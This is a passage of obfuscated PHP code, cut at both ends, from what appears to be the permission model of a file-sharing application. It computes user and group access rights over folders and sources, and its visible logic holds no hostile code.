continue; } $àùäÉ—— = $this->authMake($ç¹»ı’à, $Ü€—Ñš); if (!$àùäÉ—— || !$àùäÉ——[$Ø•Úü‚´[2214]]) { continue; } $ö¥ß°ÒÄ[$Ü€—Ñš] = array($Ø•Úü‚´[2212] => $Ø•Úü‚´[2217], $Ø•Úü‚´[2214] => $àùäÉ——[$Ø•Úü‚´[2214]], $Ø•Úü‚´[2192] => $Ÿ¹Çì¸‚[$Ø•Úü‚´[2192]], $Ø•Úü‚´[498] => $àùäÉ——[$Ø•Úü‚´[553]], $Ø•Úü‚´[499] => $àùäÉ——[$Ø•Úü‚´[553]][$Ø•Úü‚´[498]], $Ø•Úü‚´[2216] => $àùäÉ——[$Ø•Úü‚´[2218]]); } } $ö¥ß°ÒÄ = array_sort_by($ö¥ß°ÒÄ, $Ø•Úü‚´[499], $Ø•Úü‚´[537]); return $ö¥ß°ÒÄ; } public function getAllChildren($¨èĞ”) { $ÂË¡Çİè =& $_SERVER[Î·Ü›öğ]; $çëñ‘ = Model($ÂË¡Çİè[1458])->sourceInfo($¨èĞ”); if ($çëñ‘[$ÂË¡Çİè[496]] != $ÂË¡Çİè[91]) { return $this->sourceListAuth(array($¨èĞ”)); } if ($çëñ‘[$ÂË¡Çİè[191]] != SourceModel::TYPE_GROUP) { return array(); } $®¤¶æ€Â = 1; $Ğ‰°ò÷ë = array($¨èĞ”); if ($çëñ‘[$ÂË¡Çİè[193]] == $ÂË¡Çİè[231] && $çëñ‘[$ÂË¡Çİè[582]] != $®¤¶æ€Â) { $Ğ‰°ò÷ë = $this->groupChidldAllRootSource($çëñ‘[$ÂË¡Çİè[582]]); } $ÈÚåÆêÔ = $this->field($ÂË¡Çİè[194])->group($ÂË¡Çİè[194])->select(); $ÈÚåÆêÔ = array_to_keyvalue($ÈÚåÆêÔ, $ÂË¡Çİè[12], $ÂË¡Çİè[194]); if (!$ÈÚåÆêÔ) { return array(); } $øèš‘ñ» = $ÂË¡Çİè[2219]; $şÒ®½‹ì = array($ÂË¡Çİè[194] => array($ÂË¡Çİè[7], $ÈÚåÆêÔ), $ÂË¡Çİè[516] => $ÂË¡Çİè[231]); $½¼ÏÙÍ = Model($ÂË¡Çİè[922])->field($øèš‘ñ»)->where($şÒ®½‹ì)->select(); $ÎÂšğáÓ = array($¨èĞ”); foreach ($½¼ÏÙÍ as $ºûÀ«çí) { foreach ($Ğ‰°ò÷ë as $“†•øõ§) { $¤¥’–“Û = $ÂË¡Çİè[50] . $“†•øõ§ . $ÂË¡Çİè[50]; $Æ§µ­Ì = $ºûÀ«çí[$ÂË¡Çİè[597]] . $ºûÀ«çí[$ÂË¡Çİè[194]] . $ÂË¡Çİè[50]; if (strstr($Æ§µ­Ì, $¤¥’–“Û)) { $ÎÂšğáÓ[] = $ºûÀ«çí[$ÂË¡Çİè[194]]; break; } } } return $this->sourceListAuth($ÎÂšğáÓ); } private function sourceListAuth($§­±¡â¹) { $ªÑü»ñ¾ =& $_SERVER[Î·Ü›öğ]; $›êÕ™×‘ = Model($ªÑü»ñ¾[1458])->sourceListInfo($§­±¡â¹, !0); $’„©ÕÖ‘ = $this->sourceAuthSelect($§­±¡â¹); $Ò¨Ø£ëû = array(); $°úéêÈØ = array(); foreach ($›êÕ™×‘ as $£ÔÔŸŸµ) { unset($£ÔÔŸŸµ[$ªÑü»ñ¾[540]]); unset($£ÔÔŸŸµ[$ªÑü»ñ¾[538]]); unset($£ÔÔŸŸµ[$ªÑü»ñ¾[498]]); unset($£ÔÔŸŸµ[$ªÑü»ñ¾[90]]); $ÉØ¹À™ = $’„©ÕÖ‘[$£ÔÔŸŸµ[$ªÑü»ñ¾[194]]]; if (!$ÉØ¹À™) { continue; } $£ÔÔŸŸµ[$ªÑü»ñ¾[2216]] = $this->authTargetInfo($ÉØ¹À™); $£ÔÔŸŸµ[$ªÑü»ñ¾[595]] = rtrim($£ÔÔŸŸµ[$ªÑü»ñ¾[601]], $ªÑü»ñ¾[8]) . $ªÑü»ñ¾[8] . ltrim($£ÔÔŸŸµ[$ªÑü»ñ¾[595]], $ªÑü»ñ¾[8]); $Ò¨Ø£ëû[] = $£ÔÔŸŸµ; $¸ÚÃçúò = count(explode($ªÑü»ñ¾[8], trim($£ÔÔŸŸµ[$ªÑü»ñ¾[595]], $ªÑü»ñ¾[8]))); $°úéêÈØ[] = $¸ÚÃçúò + ($£ÔÔŸŸµ[$ªÑü»ñ¾[33]] == $ªÑü»ñ¾[78] ? 0 : 1000); } array_multisort($°úéêÈØ, SORT_ASC, $Ò¨Ø£ëû); return $Ò¨Ø£ëû; } private function groupChidldAllRootSource($ËìâĞ) { $œ›Áî·í =& $_SERVER[Î·Ü›öğ]; $Éş‰¢òø = Model($œ›Áî·í[1418])->groupChildrenAll($ËìâĞ); $¡Šøœìæ = array($œ›Áî·í[193] => 0, $œ›Áî·í[582] => array($œ›Áî·í[7], $Éş‰¢òø), $œ›Áî·í[191] => SourceModel::TYPE_GROUP); $÷òˆÇ° = Model($œ›Áî·í[922])->field($œ›Áî·í[194])->where($¡Šøœìæ)->select(); $÷òˆÇ° = array_to_keyvalue($÷òˆÇ°, $œ›Áî·í[12], $œ›Áî·í[194]); return $÷òˆÇ°; } private function authTargetInfo($‘îÆŞ ) { $‘ Úñº± =& $_SERVER[Î·Ü›öğ]; $‡Ñ—ª°É = array(); $„…Ìêá— = array(); $·ü©¢ó = 2 << 25; foreach ($‘îÆŞ  as $ú½Ë›§) { $Î™šâÌû = Model($‘ Úñº±[584])->listData($ú½Ë›§[$‘ Úñº±[2118]]); if (!$Î™šâÌû) { continue; } if ($ú½Ë›§[$‘ Úñº±[191]] == SourceModel::TYPE_USER) { $ºç“û = Model($‘ Úñº±[590])->getInfoSimpleOuter($ú½Ë›§[$‘ Úñº±[582]]); if ($ºç“û[$‘ Úñº±[1810]] == $‘ Úñº±[1303]) { continue; } if ($ºç“û[$‘ Úñº±[1810]] == $‘ Úñº±[231]) { $ºç“û[$‘ Úñº±[32]] = LNG($‘ Úñº±[2220]); } } else { $ºç“û = Model($‘ Úñº±[598])->getInfoSimple($ú½Ë›§[$‘ Úñº±[582]]); } if (!$ºç“û) { continue; } $ºç“û[$‘ Úñº±[553]] = $Î™šâÌû; $‡Ñ—ª°É[] = $ºç“û; $ëŠ÷ê°à = 0; if ($ú½Ë›§[$‘ Úñº±[191]] == SourceModel::TYPE_GROUP) { $ëŠ÷ê°à = $·ü©¢ó * 2; } if ($ú½Ë›§[$‘ Úñº±[191]] == SourceModel::TYPE_USER) { $ëŠ÷ê°à = $·ü©¢ó; } if ($ú½Ë›§[$‘ Úñº±[191]] == SourceModel::TYPE_USER && $ú½Ë›§[$‘ Úñº±[582]] == $‘ Úñº±[231]) { $ëŠ÷ê°à = 0; } $„…Ìêá—[] = $Î™šâÌû[$‘ Úñº±[498]] + $ëŠ÷ê°à; } array_multisort($„…Ìêá—, SORT_DESC, $‡Ñ—ª°É); return $‡Ñ—ª°É; } public function getAllChildrenByUser($†÷³È‚¦, $çîÈø½³) { $ÇÁæ…ƒ‹ =& $_SERVER[Î·Ü›öğ]; $šÜÆ§ßŠ = Model($ÇÁæ…ƒ‹[610])->getInfo($çîÈø½³); if (!$çîÈø½³ || !$†÷³È‚¦ || !$šÜÆ§ßŠ) { return array(); } $³íÆºÅ£ = Model($ÇÁæ…ƒ‹[1458])->sourceInfo($†÷³È‚¦); $ã¥¦°‰³ = array(); $å³¥×°¯ = 1; if ($³íÆºÅ£[$ÇÁæ…ƒ‹[193]] == $ÇÁæ…ƒ‹[231] && $³íÆºÅ£[$ÇÁæ…ƒ‹[582]] != $å³¥×°¯ && $this->groupContainUser($³íÆºÅ£[$ÇÁæ…ƒ‹[582]], $çîÈø½³)) { foreach ($šÜÆ§ßŠ[$ÇÁæ…ƒ‹[1419]] as $à´ôˆ°‡) { $Â¯Ã­°… = Model($ÇÁæ…ƒ‹[598])->getInfo($à´ôˆ°‡[$ÇÁæ…ƒ‹[1420]]); $ÄÉƒà¡Ó = Model($ÇÁæ…ƒ‹[610])->getInfoSimpleOuter($çîÈø½³); $ÄÉƒà¡Ó[$ÇÁæ…ƒ‹[553]] = $à´ôˆ°‡[$ÇÁæ…ƒ‹[498]]; if (Model($ÇÁæ…ƒ‹[584])->authCheckAction($à´ôˆ°‡[$ÇÁæ…ƒ‹[498]][$ÇÁæ…ƒ‹[498]], $ÇÁæ…ƒ‹[2031])) { continue; } $†˜‰Üğö = array($ÇÁæ…ƒ‹[32] => $ÇÁæ…ƒ‹[1323] . $Â¯Ã­°…[$ÇÁæ…ƒ‹[32]], $ÇÁæ…ƒ‹[194] => $Â¯Ã­°…[$ÇÁæ…ƒ‹[90]][$ÇÁæ…ƒ‹[194]], $ÇÁæ…ƒ‹[87] => KodIO::make($Â¯Ã­°…[$ÇÁæ…ƒ‹[90]][$ÇÁæ…ƒ‹[194]]), $ÇÁæ…ƒ‹[193] => $ÇÁæ…ƒ‹[231], $ÇÁæ…ƒ‹[191] => $ÇÁæ…ƒ‹[591], $ÇÁæ…ƒ‹[33] => $ÇÁæ…ƒ‹[632], $ÇÁæ…ƒ‹[595] => $Â¯Ã­°…[$ÇÁæ…ƒ‹[602]], $ÇÁæ…ƒ‹[1420] => $Â¯Ã­°…[$ÇÁæ…ƒ‹[1420]], $ÇÁæ…ƒ‹[599] => $Â¯Ã­°…[$ÇÁæ…ƒ‹[193]], $ÇÁæ…ƒ‹[2216] => array($ÄÉƒà¡Ó)); $ã¥¦°‰³[$†˜‰Üğö[$ÇÁæ…ƒ‹[194]]] = $†˜‰Üğö; } } $Ç¿ÙÙ“© = array(); $âò°±şÏ = $this->getAllChildren($†÷³È‚¦); foreach ($âò°±şÏ as $‘¶¯ÒÓå) { $ƒ€ù„á = !1; foreach ($‘¶¯ÒÓå[$ÇÁæ…ƒ‹[2216]] as $çŞÑëìã) { if ($çŞÑëìã[$ÇÁæ…ƒ‹[1810]]) { if ($çŞÑëìã[$ÇÁæ…ƒ‹[1810]] == $çîÈø½³) { $ƒ€ù„á = !0; break; } } if ($çŞÑëìã[$ÇÁæ…ƒ‹[1420]]) { if ($this->groupContainUser($çŞÑëìã[$ÇÁæ…ƒ‹[1420]], $çîÈø½³)) { $ƒ€ù„á = !0; break; } } } if ($ƒ€ù„á) { $Ç¿ÙÙ“©[] = $‘¶¯ÒÓå; } $–°¦Ù¸š = $‘¶¯ÒÓå[$ÇÁæ…ƒ‹[194]]; if (isset($ã¥¦°‰³[$–°¦Ù¸š])) { $‘¶¯ÒÓå[$ÇÁæ…ƒ‹[2216]][] = $ã¥¦°‰³[$–°¦Ù¸š][0]; $ã¥¦°‰³[$–°¦Ù¸š] = !1; } } $ã¥¦°‰³ = array_filter(array_values($ã¥¦°‰³)); $Ç¿ÙÙ“© = array_merge($ã¥¦°‰³, $Ç¿ÙÙ“©); return $Ç¿ÙÙ“©; } public function setAllChildrenByUser($öƒÒåİã, $–½§ëäà, $®”öüè) { $Â¾´·Åˆ =& $_SERVER[Î·Ü›öğ]; $„Ô®à›ú = $this->getAllChildrenByUser($öƒÒåİã, $–½§ëäà); if (!$®”öüè || !$„Ô®à›ú) { return !1; } foreach ($„Ô®à›ú as $¢µ÷‘à) { $ÖË¯İÒ¸ = array(); foreach ($¢µ÷‘à[$Â¾´·Åˆ[2216]] as $‘¶Íâ) { $Œ™’ë» = $‘¶Íâ[$Â¾´·Åˆ[553]]; $º”’ñáÛ = $‘¶Íâ[$Â¾´·Åˆ[1810]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $®îĞË«² = $‘¶Íâ[$Â¾´·Åˆ[1810]] ? $‘¶Íâ[$Â¾´·Åˆ[1810]] : $‘¶Íâ[$Â¾´·Åˆ[1420]]; if ($‘¶Íâ[$Â¾´·Åˆ[1810]] && $‘¶Íâ[$Â¾´·Åˆ[1810]] == $–½§ëäà) { continue; } $ÖË¯İÒ¸[] = array($Â¾´·Åˆ[194] => $¢µ÷‘à[$Â¾´·Åˆ[194]], $Â¾´·Åˆ[191] => $º”’ñáÛ, $Â¾´·Åˆ[582] => intval($®îĞË«²), $Â¾´·Åˆ[2118] => isset($Œ™’ë»[$Â¾´·Åˆ[477]]) ? intval($Œ™’ë»[$Â¾´·Åˆ[477]]) : 0, $Â¾´·Åˆ[2181] => isset($Œ™’ë»[$Â¾´·Åˆ[2181]]) ? intval($Œ™’ë»[$Â¾´·Åˆ[2181]]) : -1); } $ÖË¯İÒ¸[] = array($Â¾´·Åˆ[194] => $¢µ÷‘à[$Â¾´·Åˆ[194]], $Â¾´·Åˆ[191] => SourceModel::TYPE_USER, $Â¾´·Åˆ[582] => intval($–½§ëäà), $Â¾´·Åˆ[2118] => intval($®”öüè), $Â¾´·Åˆ[2181] => -1); $this->where(array($Â¾´·Åˆ[502] => $¢µ÷‘à[$Â¾´·Åˆ[194]]))->delete(); $this->addAll($ÖË¯İÒ¸); } return !0; } public function get($È¤´øõ›) { $Ì¥áÕ®ì = $this->getSourceList(array($È¤´øõ›), !0); return $Ì¥áÕ®ì[0]; } public function getSourceList($ºß œ™„, $»–ÙØÒ = false, $¦‘ÚØßœ = false) { $ñÒÔ¹úü =& $_SERVER[Î·Ü›öğ]; if (!$ºß œ™„) { return array(); } $òÑáÛ¦Ş = Model($ñÒÔ¹úü[1458]); if (!$»–ÙØÒ && count($ºß œ™„) == 1) { $»–ÙØÒ = array(); $»–ÙØÒ[$ºß œ™„[0]] = $òÑáÛ¦Ş->sourceInfo($ºß œ™„[0]); } if (!$»–ÙØÒ) { $¬…à¶À¤ = array($ñÒÔ¹úü[502] => array($ñÒÔ¹úü[503], $ºß œ™„)); $»–ÙØÒ = $òÑáÛ¦Ş->field($ñÒÔ¹úü[2221])->where($¬…à¶À¤)->select(); $»–ÙØÒ = array_to_keyvalue($»–ÙØÒ, $ñÒÔ¹úü[194]); } $¸Àûú ğ = $ºß œ™„; foreach ($»–ÙØÒ as $’èº˜ => $Æéò¹ß) { $û–¼¶øè = $òÑáÛ¦Ş->parentLevelArray($Æéò¹ß[$ñÒÔ¹úü[597]]); $¸Àûú ğ = array_merge($¸Àûú ğ, array(intval($’èº˜)), array_reverse($û–¼¶øè)); } $¸Àûú ğ = array_values(array_unique($¸Àûú ğ)); if (!$¸Àûú ğ) { return array(); } $³”´ÂĞ« = $this->sourceAuthSelect($¸Àûú ğ); $ã¬Ê©×¨ = array(); foreach ($¸Àûú ğ as $ÍóÇ¢®Á) { if (isset($³”´ÂĞ«[$ÍóÇ¢®Á])) { $ã¬Ê©×¨[$ÍóÇ¢®Á] = $³”´ÂĞ«[$ÍóÇ¢®Á]; } } $£…æªØ® = $this->userIsRoot($¦‘ÚØßœ); $šÑ¶ø¿î = AuthModel::authAll(); $¬Ø“à¸ = array($ñÒÔ¹úü[499] => $šÑ¶ø¿î, $ñÒÔ¹úü[2222] => array($ñÒÔ¹úü[504] => 0, $ñÒÔ¹úü[2016] => $šÑ¶ø¿î, $ñÒÔ¹úü[505] => LNG($ñÒÔ¹úü[2203]), $ñÒÔ¹úü[2033] => $ñÒÔ¹úü[2204])); $¾¶ËÍ®‹ = array(); foreach ($»–ÙØÒ as $ÍóÇ¢®Á => $£ğóÁ³­) { if ($£…æªØ® && $GLOBALS[$ñÒÔ¹úü[6]][$ñÒÔ¹úü[2029]]) { $¾¶ËÍ®‹[$ÍóÇ¢®Á] = $¬Ø“à¸; continue; } $¾¶ËÍ®‹[$ÍóÇ¢®Á] = $this->makeSourceAuth($£ğóÁ³­, $ã¬Ê©×¨, $¦‘ÚØßœ); } return $¾¶ËÍ®‹; } public function authDeepCheck($ñ‚ïÉ, $µ¹ËÃ® = false) { $ŞÉ©’¼ =& $_SERVER[Î·Ü›öğ]; $µ¹ËÃ® = $µ¹ËÃ® ? $µ¹ËÃ® : USER_ID; $Ääø¿ç = $this->makeAuthDeep($µ¹ËÃ®); if (!in_array($ñ‚ïÉ, $Ääø¿ç[$ŞÉ©’¼[2223]])) { return !1; } $Á¹º¾€† = array(); foreach ($Ääø¿ç[$ŞÉ©’¼[2224]] as $ÊßîÕÄò => $ÚñíË‡¾) { if (!in_array($ñ‚ïÉ, $ÚñíË‡¾)) { continue; } $Á¹º¾€†[] = $ÊßîÕÄò; } if (!$Á¹º¾€†) { return !1; } $öáú¹âß = $Á¹º¾€† ? $Á¹º¾€†[0] : $ñ‚ïÉ; return array($ŞÉ©’¼[499] => -1, $ŞÉ©’¼[553] => array($ŞÉ©’¼[504] => $ŞÉ©’¼[1303], $ŞÉ©’¼[2016] => $ŞÉ©’¼[231], $ŞÉ©’¼[505] => LNG($ŞÉ©’¼[2225]), $ŞÉ©’¼[2033] => $ŞÉ©’¼[2226]), $ŞÉ©’¼[2214] => LNG($ŞÉ©’¼[2227]), $ŞÉ©’¼[2228] => $this->sourceAuthInfo($öáú¹âß)); } protected function makeAuthDeep($Ç¡àèâÚ = false) { $ê°¼À‡İ =& $_SERVER[Î·Ü›öğ]; static $ı÷É›ÆÉ = array(); $Ç¡àèâÚ = $Ç¡àèâÚ ? $Ç¡àèâÚ : USER_ID; if (isset($ı÷É›ÆÉ[$Ç¡àèâÚ])) { return $ı÷É›ÆÉ[$Ç¡àèâÚ]; } $‘ ‹„Ö = Model($ê°¼À‡İ[2229])->listData(); $“Ø„—¥¼ = array(); foreach ($‘ ‹„Ö as $‹ºøÒıª) { if ($‹ºøÒıª[$ê°¼À‡İ[498]] == 0 && $‹ºøÒıª[$ê°¼À‡İ[2032]] == $ê°¼À‡İ[91]) { $“Ø„—¥¼[] = $‹ºøÒıª[$ê°¼À‡İ[477]]; } } $Ñë¬ê‹ñ = $this->userGroupParents($Ç¡àèâÚ); $÷íÂ¼İå = array($ê°¼À‡İ[191] => SourceModel::TYPE_USER, $ê°¼À‡İ[582] => $Ç¡àèâÚ); if ($Ñë¬ê‹ñ) { $÷íÂ¼İå = array(array($ê°¼À‡İ[191] => SourceModel::TYPE_USER, $ê°¼À‡İ[582] => $Ç¡àèâÚ), array($ê°¼À‡İ[191] => SourceModel::TYPE_GROUP, $ê°¼À‡İ[582] => array($ê°¼À‡İ[503], $Ñë¬ê‹ñ)), $ê°¼À‡İ[1099] => $ê°¼À‡İ[2112]); } $ĞóÁ‚ô = $this->field($ê°¼À‡İ[2230])->where($÷íÂ¼İå)->select(); $‘å¤¾º = array(); $äÙğîş = array_to_keyvalue_group($ĞóÁ‚ô, $ê°¼À‡İ[194]); foreach ($äÙğîş as $—à«Ûê† => $§óœ‰ë) { $„ë€¨È = $this->authArrayCheck($§óœ‰ë, $Ç¡àèâÚ); if ($„ë€¨È[$ê°¼À‡İ[499]] > 0) { $‘å¤¾º[] = $—à«Ûê† . $ê°¼À‡İ[12]; } } if ($Ñë¬ê‹ñ) { $Ïá¨ãåœ = Model($ê°¼À‡İ[598]); foreach ($Ñë¬ê‹ñ as $ÜÄ–Õ) { $—•À„–æ = $Ïá¨ãåœ->getInfo($ÜÄ–Õ); if (!$—•À„–æ || !is_array($—•À„–æ[$ê°¼À‡İ[90]])) { continue; } $‘å¤¾º[] = $—•À„–æ[$ê°¼À‡İ[90]][$ê°¼À‡İ[194]]; } } $Ôúü›ãª = array(); $ºÆÅî§è = $Ñë¬ê‹ñ; $ü§¨Í² = Model($ê°¼À‡İ[1458]); $Ïá¨ãåœ = Model($ê°¼À‡İ[598]); $Ñ¬ãèòÇ = array(); $¯¨¾î = array(); $§ÆÄïòß = array(); $ş§ëµè’ = array(); if ($‘å¤¾º) { $Œóöö°² = $ü§¨Í²->where(array($ê°¼À‡İ[194] => array($ê°¼À‡İ[503], $‘å¤¾º)))->select(); foreach ($Œóöö°² as $Ò¬êƒ¼Ğ) { if ($Ò¬êƒ¼Ğ[$ê°¼À‡İ[516]] == $ê°¼À‡İ[91]) { continue; } $õÈ•ÚÇı = $ü§¨Í²->parentLevelArray($Ò¬êƒ¼Ğ[$ê°¼À‡İ[597]]); $Ôúü›ãª = array_merge($Ôúü›ãª, $õÈ•ÚÇı); $ºÆÅî§è[] = $Ò¬êƒ¼Ğ[$ê°¼À‡İ[582]]; $Ñ¬ãèòÇ[$Ò¬êƒ¼Ğ[$ê°¼À‡İ[194]]] = $õÈ•ÚÇı; $¯¨¾î[$Ò¬êƒ¼Ğ[$ê°¼À‡İ[194]]] = $Ò¬êƒ¼Ğ[$ê°¼À‡İ[582]]; } } $ºÆÅî§è = array_values(array_unique($ºÆÅî§è)); $üİê¨ì¾ = $ºÆÅî§è; foreach ($üİê¨ì¾ as $ÜÄ–Õ) { $—•À„–æ = $Ïá¨ãåœ->getInfo($ÜÄ–Õ); $õÈ•ÚÇı = $ü§¨Í²->parentLevelArray($—•À„–æ[$ê°¼À‡İ[597]]); $ºÆÅî§è = array_merge($ºÆÅî§è, $õÈ•ÚÇı); } $ºÆÅî§è = array_values(array_unique($ºÆÅî§è)); foreach ($ºÆÅî§è as $ÜÄ–Õ) { $—•À„–æ = $Ïá¨ãåœ->getInfo($ÜÄ–Õ); $Ôúü›ãª[] = $—•À„–æ[$ê°¼À‡İ[90]][$ê°¼À‡İ[194]]; $§ÆÄïòß[$ÜÄ–Õ] = $—•À„–æ[$ê°¼À‡İ[90]][$ê°¼À‡İ[194]]; $ş§ëµè’[$ÜÄ–Õ] = $ü§¨Í²->parentLevelArray($—•À„–æ[$ê°¼À‡İ[597]]); } foreach ($Ñ¬ãèòÇ as $”Ò…Ê®š => $ƒÌ‰Î¤“) { $ø„äÆ½º = $¯¨¾î[$”Ò…Ê®š]; if (!$ø„äÆ½º || !$§ÆÄïòß[$ø„äÆ½º]) { continue; } $Á¾õñû = array(); foreach ($ş§ëµè’[$ø„äÆ½º] as $ÜÄ–Õ) { $Á¾õñû[] = $§ÆÄïòß[$ÜÄ–Õ]; } $Ñ¬ãèòÇ[$”Ò…Ê®š] = array_merge($Á¾õñû, $ƒÌ‰Î¤“); } $Ôúü›ãª = array_values(array_unique($Ôúü›ãª)); $òŸìø”â = array($ê°¼À‡İ[2223] => $Ôúü›ãª, $ê°¼À‡İ[2224] => $Ñ¬ãèòÇ); $ı÷É›ÆÉ[$Ç¡àèâÚ] = $òŸìø”â; return $òŸìø”â; } private function makeSourceAuth($ŠŒ•Û”´, $ĞÛç‡ï, $õºáÀ¯¶ = false) { $›£¶Öïù =& $_SERVER[Î·Ü›öğ]; $‘ ¡Í“ô = $›£¶Öïù[91]; $µ¸à­Ë« = $ŠŒ•Û”´[$›£¶Öïù[582]]; $ó©ÏÍ¤Á = $ŠŒ•Û”´[$›£¶Öïù[191]] == SourceModel::TYPE_GROUP; $Á½Õº¾å = $ó©ÏÍ¤Á ? $this->groupRootAuth($µ¸à­Ë«, $õºáÀ¯¶) : !1; if ($Á½Õº¾å && Model($›£¶Öïù[584])->authCheckAction($Á½Õº¾å[$›£¶Öïù[498]], $›£¶Öïù[2031])) { return $this->groupAuthInfo($Á½Õº¾å, $µ¸à­Ë«); } $¯²ØòÎ› = Model($›£¶Öïù[1458])->parentLevelArray($ŠŒ•Û”´[$›£¶Öïù[597]]); $¯²ØòÎ› = array_merge(array($ŠŒ•Û”´[$›£¶Öïù[194]]), array_reverse($¯²ØòÎ›)); $¯šÅ¨š = !1; foreach ($¯²ØòÎ› as $˜èşà) { if (!isset($ĞÛç‡ï[$˜èşà])) { continue; } $³¿•ŠÄŠ = $this->authMake($ĞÛç‡ï[$˜èşà], $õºáÀ¯¶); if ($³¿•ŠÄŠ[$›£¶Öïù[553]]) { $¯šÅ¨š = $³¿•ŠÄŠ; break; } } if (!$ó©ÏÍ¤Á) { return $¯šÅ¨š; } if (!$¯šÅ¨š && $Á½Õº¾å) { $¯šÅ¨š = $this->groupAuthInfo($Á½Õº¾å, $µ¸à­Ë«); } if (!$¯šÅ¨š) { $ö¬Õ¯õ” = Model($›£¶Öïù[598])->getInfo($µ¸à­Ë«); $„ïˆˆªÁ = explode($›£¶Öïù[50], trim($ö¬Õ¯õ”[$›£¶Öïù[597]], $›£¶Öïù[50])); $„ïˆˆªÁ = array_reverse($„ïˆˆªÁ); foreach ($„ïˆˆªÁ as $¢¼³§¸Õ) { if ($¢¼³§¸Õ == $›£¶Öïù[231] || $¢¼³§¸Õ == $‘ ¡Í“ô) { continue; } $ßÒŒÅÄú = $this->groupRootAuth($¢¼³§¸Õ, $õºáÀ¯¶); if (!$ßÒŒÅÄú) { continue; } $¯šÅ¨š = $this->groupAuthInfo($ßÒŒÅÄú, $¢¼³§¸Õ); break; } } if (!$¯šÅ¨š || $¯šÅ¨š[$›£¶Öïù[499]] <= 0) { $Ì®¨§Ã¨ = $this->authDeepCheck($ŠŒ•Û”´[$›£¶Öïù[194]], $õºáÀ¯¶); if ($Ì®¨§Ã¨) { $¯šÅ¨š = $Ì®¨§Ã¨; } } return $¯šÅ¨š; } private function userIsRoot($®ÄäŞÀõ = false) { $·˜ìÖ« =& $_SERVER[Î·Ü›öğ]; if (!$®ÄäŞÀõ && KodUser::isRoot()) { return !0; } $‹†ë¦•Ù = Model($·˜ìÖ«[610])->getInfo($®ÄäŞÀõ); $Ù¿¬¸–‹ = Model($·˜ìÖ«[2207])->listData($‹†ë¦•Ù[$·˜ìÖ«[2208]]); if ($Ù¿¬¸–‹ && $Ù¿¬¸–‹[$·˜ìÖ«[588]][$·˜ìÖ«[2211]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ÙğëÑ´í) { $ÉğÉ°ñ =& $_SERVER[Î·Ü›öğ]; $ïö¤ö¡Ç = Model($ÉğÉ°ñ[1458]); $ƒÌÚ‰½ô = $ïö¤ö¡Ç->sourceInfo($ÙğëÑ´í); if (!$ƒÌÚ‰½ô) { return !1; } $ïö¤ö¡Ç->groupPathDisplay($ƒÌÚ‰½ô); $ÃÑùëÒñ = array($ƒÌÚ‰½ô); $ÃÑùëÒñ = $ïö¤ö¡Ç->_listAppendPath($ÃÑùëÒñ, !1); $ƒÌÚ‰½ô = $ÃÑùëÒñ[0]; $“Ò©ÍŞò = $ƒÌÚ‰½ô[$ÉğÉ°ñ[595]]; if (isset($ƒÌÚ‰½ô[$ÉğÉ°ñ[603]])) { $óËÛ•§Ù = explode($ÉğÉ°ñ[8], trim($ƒÌÚ‰½ô[$ÉğÉ°ñ[595]], $ÉğÉ°ñ[8])); array_shift($óËÛ•§Ù); $“Ò©ÍŞò = $ƒÌÚ‰½ô[$ÉğÉ°ñ[601]] . $ÉğÉ°ñ[2231] . implode($ÉğÉ°ñ[8], $óËÛ•§Ù); } return array($ÉğÉ°ñ[32] => $ƒÌÚ‰½ô[$ÉğÉ°ñ[32]], $ÉğÉ°ñ[194] => $ƒÌÚ‰½ô[$ÉğÉ°ñ[194]], $ÉğÉ°ñ[87] => KodIO::make($ƒÌÚ‰½ô[$ÉğÉ°ñ[194]]), $ÉğÉ°ñ[595] => $“Ò©ÍŞò); } private function groupAuthInfo($îÄå— , $½Àäœ÷í) { $¿È”½÷ =& $_SERVER[Î·Ü›öğ]; $×–ù¾¹ƒ = Model($¿È”½÷[598])->getInfo($½Àäœ÷í); return array($¿È”½÷[2232] => intval($îÄå— [$¿È”½÷[498]]), $¿È”½÷[2222] => $îÄå— , $¿È”½÷[2233] => LNG($¿È”½÷[2234]), $¿È”½÷[2228] => array($¿È”½÷[505] => $×–ù¾¹ƒ[$¿È”½÷[32]], $¿È”½÷[87] => KodIO::make($×–ù¾¹ƒ[$¿È”½÷[90]][$¿È”½÷[194]]), $¿È”½÷[2235] => $×–ù¾¹ƒ[$¿È”½÷[602]])); } protected function groupRootAuth($ŸÃ­—®ö, $Òóô¹š = false) { $ú× Ãåó =& $_SERVER[Î·Ü›öğ]; $Òóô¹š = $Òóô¹š ? $Òóô¹š : USER_ID; $¸éîåÃ = $Òóô¹š . $ú× Ãåó[2236] . $ŸÃ­—®ö; static $ÂéÀ†æÖ = array(); if (isset($ÂéÀ†æÖ[$¸éîåÃ])) { return $ÂéÀ†æÖ[$¸éîåÃ]; } $‡Û—‘Šè = Model($ú× Ãåó[598])->getInfo($ŸÃ­—®ö); $Ã’·¶’£ = $this->userGroupList($Òóô¹š); $³õóÔ¾ = isset($Ã’·¶’£[$ŸÃ­—®ö]) ? $Ã’·¶’£[$ŸÃ­—®ö][$ú× Ãåó[498]] : !1; if ($³õóÔ¾ && Model($ú× Ãåó[584])->authCheckAction($³õóÔ¾[$ú× Ãåó[498]], $ú× Ãåó[2031])) { $ÂéÀ†æÖ[$¸éîåÃ] = $³õóÔ¾; return $³õóÔ¾; } $«ñš›ó… = $this->sourceAuthSelect($‡Û—‘Šè[$ú× Ãåó[90]][$ú× Ãåó[194]]); $»êµñÍˆ = $«ñš›ó… ? $this->authMake($«ñš›ó…, $Òóô¹š) : !1; $ü¯Ğ®‚Â = $»êµñÍˆ ? $»êµñÍˆ[$ú× Ãåó[553]] : !1; $ÂéÀ†æÖ[$¸éîåÃ] = $ü¯Ğ®‚Â ? $ü¯Ğ®‚Â : $³õóÔ¾; return $ÂéÀ†æÖ[$¸éîåÃ]; } public function authOwnerApply($†ëÛ‰¯) { $Á¿ÚÆğĞ =& $_SERVER[Î·Ü›öğ]; if (empty($†ëÛ‰¯[$Á¿ÚÆğĞ[498]]) || isset($†ëÛ‰¯[$Á¿ÚÆğĞ[2237]]) && $†ëÛ‰¯[$Á¿ÚÆğĞ[2237]]) { return $†ëÛ‰¯; } if (AuthModel::authCheckRoot($†ëÛ‰¯[$Á¿ÚÆğĞ[498]][$Á¿ÚÆğĞ[499]])) { return $†ëÛ‰¯; } $Ÿ˜ÂÉƒû = Model($Á¿ÚÆğĞ[1458])->parentLevelArray($†ëÛ‰¯[$Á¿ÚÆğĞ[597]]); $Ÿ˜ÂÉƒû = 